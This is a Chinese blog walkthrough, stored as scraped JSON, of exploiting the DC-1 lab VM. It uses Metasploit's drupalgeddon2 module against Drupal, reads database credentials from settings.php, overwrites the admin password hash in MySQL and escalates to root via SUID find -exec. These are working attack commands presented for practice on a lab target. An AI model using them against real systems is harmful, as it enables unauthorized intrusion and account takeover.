{"blogid": "126736824", "writerAge": "码龄1年", "writerBlogNum": "123", "writerCollect": "1508", "writerComment": "1302", "writerFan": "3532", "writerGrade": "5级", "writerIntegral": "4476", "writerName": "不知名白帽", "writerProfileAdress": "writer_image\\profile_126736824.jpg", "writerRankTotal": "3864", "writerRankWeekly": "49", "writerThumb": "1600", "writerVisitNum": "68252", "blog_read_count": "319", "blog_time": "已于 2022-09-07 08:16:52 修改", "blog_title": "DC-1靶机练习【超详细】", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p id=\"main-toc\"><strong>目录</strong></p>\n<p id=\"环境-toc\" style=\"margin-left:0px;\"><a href=\"#%E7%8E%AF%E5%A2%83\">环境</a></p>\n<p id=\"信息收集-toc\" style=\"margin-left:0px;\"><a href=\"#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\">信息收集</a></p>\n<p id=\"查看kali的ip-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%9F%A5%E7%9C%8Bkali%E7%9A%84ip\">查看kali的IP</a></p>\n<p id=\"netdiscover发现dc-1靶机ip-toc\" style=\"margin-left:40px;\"><a href=\"#netdiscover%E5%8F%91%E7%8E%B0dc-1%E9%9D%B6%E6%9C%BAip\">netdiscover发现DC-1靶机IP</a></p>\n<p id=\"%E2%80%8B%E7%BC%96%E8%BE%91-toc\" style=\"margin-left:40px;\"><a href=\"#%E2%80%8B%E7%BC%96%E8%BE%91\">​编辑</a></p>\n<p id=\"nmap扫描dc-1靶机信息-toc\" style=\"margin-left:40px;\"><a href=\"#nmap%E6%89%AB%E6%8F%8Fdc-1%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF\">nmap扫描DC-1靶机信息</a></p>\n<p id=\"%E2%80%8B%E7%BC%96%E8%BE%91-toc\" style=\"margin-left:40px;\"><a href=\"#%E2%80%8B%E7%BC%96%E8%BE%91\">​编辑</a></p>\n<p id=\"访问80端口-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3\">访问80端口</a></p>\n<p id=\"搜索drupal-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%90%9C%E7%B4%A2drupal\">搜索Drupal</a></p>\n<p id=\"漏洞扫描-toc\" style=\"margin-left:0px;\"><a href=\"#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F\">漏洞扫描</a></p>\n<p id=\"msf搜索相关漏洞-toc\" style=\"margin-left:40px;\"><a href=\"#msf%E6%90%9C%E7%B4%A2%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E\">msf搜索相关漏洞</a></p>\n<p id=\"漏洞利用-toc\" style=\"margin-left:0px;\"><a href=\"#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\">漏洞利用</a></p>\n<p id=\"%E2%80%8B%E7%BC%96%E8%BE%91-toc\" style=\"margin-left:40px;\"><a href=\"#%E2%80%8B%E7%BC%96%E8%BE%91\">​编辑</a></p>\n<p id=\"找到flag1-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%89%BE%E5%88%B0flag1\">找到flag1</a></p>\n<p id=\"找到flag2-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%89%BE%E5%88%B0flag2\">找到flag2</a></p>\n<p id=\"找到flag3-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%89%BE%E5%88%B0flag3\">找到flag3</a></p>\n<p id=\"suid提权-toc\" style=\"margin-left:0px;\"><a href=\"#suid%E6%8F%90%E6%9D%83\">SUID提权</a></p>\n<p id=\"%E2%80%8B%E7%BC%96%E8%BE%91-toc\" style=\"margin-left:40px;\"><a href=\"#%E2%80%8B%E7%BC%96%E8%BE%91\">​编辑</a></p>\n<p id=\"找到flag4-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%89%BE%E5%88%B0flag4\">找到flag4</a></p>\n<p id=\"%E2%80%8B%E7%BC%96%E8%BE%91-toc\" style=\"margin-left:40px;\"><a href=\"#%E2%80%8B%E7%BC%96%E8%BE%91\">​编辑</a></p>\n<p id=\"%E2%80%8B%E7%BC%96%E8%BE%91-toc\" style=\"margin-left:40px;\"><a href=\"#%E2%80%8B%E7%BC%96%E8%BE%91\">​编辑</a></p>\n<p id=\"找到thefinalflagtxt-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%89%BE%E5%88%B0thefinalflagtxt\">找到thefinalflag.txt</a></p>\n<hr id=\"hr-toc\"/>\n<p></p>\n<p>对下载的DC-1.zip文件进行解压</p>\n<p><img alt=\"\" height=\"158\" src=\"image\\2fab7cceb9d44b5182efabbbf2ace03e.png\" width=\"905\"/></p>\n<p></p>\n<p>VM打开DC-1.ova文件（快捷键Ctrl+O）</p>\n<p><img alt=\"\" height=\"210\" src=\"image\\35df085487af4cde938a67491245ca9d.png\" width=\"805\"/></p>\n<p></p>\n<p>开启DC-1</p>\n<p><img alt=\"\" height=\"253\" src=\"image\\b3cc94d28fef47179b38e5d0f4f75114.png\" width=\"808\"/></p>\n<p></p>\n<p>将DC-1的网络模式换成NET模式，方便使用kali进行同网段扫描</p>\n<p><img alt=\"\" height=\"495\" src=\"image\\d6057aa7fd2f43d48c390e51bae1c437.png\" width=\"848\"/></p>\n<p></p>\n<h1 id=\"环境\">环境</h1>\n<p><span style=\"color:#fe2c24;\">kali的IP：192.168.20.129；DC-1靶机的IP192.168.20.130</span></p>\n<h1 id=\"信息收集\">信息收集</h1>\n<h2 id=\"查看kali的ip\">查看kali的IP</h2>\n<p><img alt=\"\" height=\"516\" src=\"image\\2fbddcf5c2a2496a8b53c893ec7feb07.png\" width=\"761\"/></p>\n<p></p>\n<p></p>\n<h2 id=\"netdiscover发现dc-1靶机ip\">netdiscover发现DC-1靶机IP</h2>\n<pre><code>netdiscover -r 192.168.20.1/24\n</code></pre>\n<p></p>\n<h2 id=\"%E2%80%8B%E7%BC%96%E8%BE%91\"><img alt=\"\" height=\"268\" src=\"image\\33a9deb99c544e6d93b5b70abb04473c.png\" width=\"683\"/></h2>\n<p></p>\n<h2 id=\"nmap扫描dc-1靶机信息\">nmap扫描DC-1靶机信息</h2>\n<pre><code>nmap -A -v -T4 192.168.20.130\n</code></pre>\n<p></p>\n<h2><img alt=\"\" height=\"699\" src=\"image\\2920e79a5ad748949dde9d01c0bd61da.png\" width=\"894\"/></h2>\n<p></p>\n<h2 id=\"访问80端口\">访问80端口</h2>\n<p><img alt=\"\" height=\"887\" src=\"image\\a0b334c8561c45e18a3a5016da5d569c.png\" width=\"1200\"/></p>\n<p></p>\n<p></p>\n<h2 id=\"搜索drupal\">搜索Drupal</h2>\n<p>Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由内容管理系统（CMS）和PHP开发框架（Framework）共同构成，在GPL2.0及更新协议下发布</p>\n<h1 id=\"漏洞扫描\">漏洞扫描</h1>\n<h2 id=\"msf搜索相关漏洞\">msf搜索相关漏洞</h2>\n<pre><code>search drupal\n</code></pre>\n<p></p>\n<p><img alt=\"\" height=\"300\" src=\"image\\ea32f024f3bb4dd98e149d743364408c.png\" width=\"1200\"/></p>\n<p></p>\n<p><span style=\"color:#fe2c24;\">Check中为\"yes\"的都可以使用</span></p>\n<h1 id=\"漏洞利用\">漏洞利用</h1>\n<p>使用模板二</p>\n<pre><code>use exploit/unix/webapp/drupal_drupalgeddon2\n</code></pre>\n<p><span style=\"color:#fe2c24;\">show options查看模板的需要配置的地方</span></p>\n<p></p>\n<p><img alt=\"\" height=\"523\" src=\"image\\3addd88971314d9d8a80161fe7cf45d4.png\" width=\"1128\"/></p>\n<p></p>\n<p>配置RHOSTS</p>\n<pre><code>set rhosts 192.168.20.130\n\nrun\n</code></pre>\n<p></p>\n<p><img alt=\"\" height=\"204\" src=\"image\\47fe163b2304495284197a2bc38daf7f.png\" width=\"924\"/></p>\n<p></p>\n<p>shell进入后渗透模块，使用python反弹一个交互式shell</p>\n<pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre>\n<h2><img alt=\"\" height=\"195\" src=\"image\\b259e50507e64474aed3f30bbec7c299.png\" width=\"667\"/></h2>\n<p></p>\n<h2 id=\"找到flag1\">找到flag1</h2>\n<p>ls查看当前文件夹下的文件，找到flag1.txt</p>\n<p></p>\n<p><img alt=\"\" height=\"52\" src=\"image\\3d980a2df80841ae8bd24027e95f8841.png\" width=\"455\"/></p>\n<p></p>\n<p>查看flag1.txt</p>\n<p></p>\n<p><span style=\"color:#fe2c24;\">flag1提示：每个优秀的CMS都需要一个配置文件—您也需要</span></p>\n<p>Drupal的默认配置文件为 /var/www/sites/default/settings.php</p>\n<p></p>\n<h2 id=\"找到flag2\">找到flag2</h2>\n<p><span style=\"color:#fe2c24;\">进入sites/default/下找settings.php,在配置文件中发现flag2和一些数据库信息</span></p>\n<p></p>\n<p><img alt=\"\" height=\"589\" src=\"image\\72312879943c493f820c6b03f96479e0.png\" width=\"802\"/></p>\n<p></p>\n<p>通过mysql，我们查看3306端口是否开放</p>\n<pre><code>netstat -anptl\n</code></pre>\n<p></p>\n<p><img alt=\"\" height=\"314\" src=\"image\\e010c4023d0f4fc9bfb75b9a85c69678.png\" width=\"842\"/></p>\n<p></p>\n<p>已经知道数据库的账号密码，而且3306端口已开放，登录数据库</p>\n<pre><code>mysql -u dbuser -p \n</code></pre>\n<p></p>\n<p><img alt=\"\" height=\"276\" src=\"image\\ca5c5428f0f74137a36a6ce17f9e9360.png\" width=\"734\"/></p>\n<p></p>\n<p>查看数据库</p>\n<pre><code>show databases;\n</code></pre>\n<p></p>\n<p><img alt=\"\" height=\"165\" src=\"image\\bbdaf6f0faa0451cb4e00c4a9c5c2ca0.png\" width=\"413\"/></p>\n<p></p>\n<p>查看drupaldb数据库中的表</p>\n<pre><code>use drupaldb;\nshow tables;\n</code></pre>\n<p></p>\n<p><img alt=\"\" height=\"614\" src=\"image\\f94f4bd55deb4b768eab41e89f448d9b.png\" width=\"804\"/></p>\n<p></p>\n<p>查看user表中的用户</p>\n<pre><code>select * from users;\n</code></pre>\n<p></p>\n<p><img alt=\"\" height=\"283\" src=\"image\\2718ff241d164aedbbf074e3d39a3b65.png\" width=\"1200\"/></p>\n<p></p>\n<p>在scripts录有password-hash.sh文件，可以用该文件生成自己的密码hash值替换数据库hash</p>\n<pre><code>find . -name “hash”\n</code></pre>\n<pre><code>php scripts/password-hash.sh password\n</code></pre>\n<p></p>\n<p><img alt=\"\" height=\"82\" src=\"image\\67b356b3f10a4255a93593738d18ed5c.png\" width=\"869\"/></p>\n<p></p>\n<p>修改密码</p>\n<pre><code>update drupaldb.users set pass='$S$DNTdRYn.oOsIM0QzOSYWQhI7XXGqr0igs4tDhcSJgEXaGVwuCKnv' where name=\"admin\"; ##修改密码\n</code></pre>\n<p></p>\n<p><img alt=\"\" height=\"104\" src=\"image\\9ea288f311e64e70a2dbfb6275813f7c.png\" width=\"984\"/></p>\n<p></p>\n<p>报错解决：</p>\n<p>Sorry, there have been more than 5 failed login attempts for this account. It is temporarily blocked. Try again later or request a new password.</p>\n<p>drupal的用户登录中，连续密码输入错误5次 该账号就无法再登录 ，试五遍就让你重置密码。</p>\n<p>所以清除flood</p>\n<pre><code>truncate flood;\n</code></pre>\n<p></p>\n<p>登录网站</p>\n<p><img alt=\"\" height=\"732\" src=\"image\\57358cb08beb4583a42f0da6ffe7fb34.png\" width=\"1200\"/></p>\n<p></p>\n<p></p>\n<p></p>\n<h2 id=\"找到flag3\">找到flag3</h2>\n<p></p>\n<p><img alt=\"\" height=\"888\" src=\"image\\01561f7190944e53aeb86c9674271c67.png\" width=\"1200\"/></p>\n<p></p>\n<p>Flag3提示词有perms、find、-exec、shadow共四个特殊提示词</p>\n<h1 id=\"suid提权\">SUID提权</h1>\n<pre><code>cat /etc/passwd\n</code></pre>\n<p></p>\n<h2><img alt=\"\" height=\"431\" src=\"image\\e56658cdcec2438fa00f60ff18a58c0c.png\" width=\"829\"/></h2>\n<p></p>\n<h2 id=\"找到flag4\">找到flag4</h2>\n<p></p>\n<p>使用find命令查找有特殊权限suid的命令<img alt=\"\" height=\"309\" src=\"image\\a63fdcfab9194c60b573dbac826dcaac.png\" width=\"725\"/></p>\n<pre><code>find / -perm -4000\n</code></pre>\n<p> <img alt=\"\" height=\"337\" src=\"image\\cda037a095bc4439993190e783c6f51d.png\" width=\"573\"/></p>\n<p></p>\n<p>使用find命令提权</p>\n<pre><code>find / -exec “/bin/bash” -p ;\n</code></pre>\n<p></p>\n<p></p>\n<h2><img alt=\"\" height=\"53\" src=\"image\\4c72bb615bb84392a166a0440912c665.png\" width=\"492\"/></h2>\n<p></p>\n<pre><code>cat flag4.txt\n</code></pre>\n<h2><img alt=\"\" height=\"84\" src=\"image\\de6fcd599684455c93af994775321b33.png\" width=\"567\"/></h2>\n<p></p>\n<h2 id=\"找到thefinalflagtxt\">找到thefinalflag.txt</h2>\n<p><img alt=\"\" height=\"229\" src=\"image\\2b0db416f45a420ab57465a1911697a6.png\" width=\"579\"/></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n</div>\n</div>"}